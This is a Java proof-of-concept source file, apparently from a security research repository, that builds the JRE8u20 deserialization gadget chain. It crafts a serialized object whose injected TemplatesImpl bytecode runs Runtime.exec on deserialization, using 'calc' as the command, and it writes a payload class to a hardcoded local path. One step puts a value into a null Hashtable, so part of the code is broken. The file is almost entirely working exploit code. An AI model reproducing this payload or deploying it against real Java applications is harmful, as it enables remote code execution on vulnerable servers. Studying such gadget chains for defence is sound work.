package com.haby0.JRE8u20;

import com.haby0.JDK7u21.JDK7u21;
import com.haby0.JDK7u21.util.ClassFiles;
import com.haby0.JDK7u21.util.ClassLoaderImpl;
import com.haby0.JDK7u21.util.Reflections;
import com.haby0.JRE8u20.util.TCObjectOutputStream;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.*;
import java.beans.beancontext.BeanContextSupport;
import java.lang.reflect.*;
import java.util.*;

public class JRE8u20 {
    public static void main(String[] args) throws Exception {
        BeanContextSupport bcs = new BeanContextSupport();

        Class cc = Class.forName("java.beans.beancontext.BeanContextSupport");
        Field serializable =  cc.getDeclaredField("serializable");
        serializable.setAccessible(true);
        serializable.set(bcs, 1);

        TemplatesImpl calc = JDK7u21.createTemplatesImpl("calc", TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);

        HashMap map = new HashMap();
        map.put("f5a5a608", "aaaa");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").
                newInstance(Templates.class, map);

        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class,1);
        allIfaces[0] = Templates.class;
        Templates templates = (Templates)Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), allIfaces, tempHandler);

        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(calc);
        set.add(templates);

        TCObjectOutputStream oos = new TCObjectOutputStream(new FileOutputStream("JRE8u20.ser"));
        oos.setTemplates(templates);
        oos.setTemplatesImpl(calc);
        oos.setInvocationHandler(tempHandler);
        oos.setBeanContextSupport(bcs);
        oos.setLhs(set);

        oos.writeObject0(set);

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("JRE8u20.ser"));
        objectInputStream.readObject();

    }

    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Foo.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(Foo.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        clazz.makeClassInitializer().insertBefore(cmd);
        clazz.setName("com.Pwner");
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);
        final byte[] classBytes = clazz.toBytecode();
        System.out.println(clazz.toBytecode());;


        FileOutputStream fos = new FileOutputStream(new File("D:\\JavaProject\\vuln\\com\\Pwner.class"));
        fos.write(classBytes);
        fos.close();

        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Foo.class)
        });


        byte[][] bytes = new byte[][] {classBytes};
        Class[] _class = new Class[1];
        _class[0] = new ClassLoaderImpl().defineClass(bytes[0]);
        Hashtable ht = null;
        ht.put(_class[0].getName(), _class[0]);
        System.out.println(ht.get(_class[0].newInstance()));
        Reflections.setFieldValue(templates, "_name", "Pwner");

        return templates;
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}


        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }


    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }
}
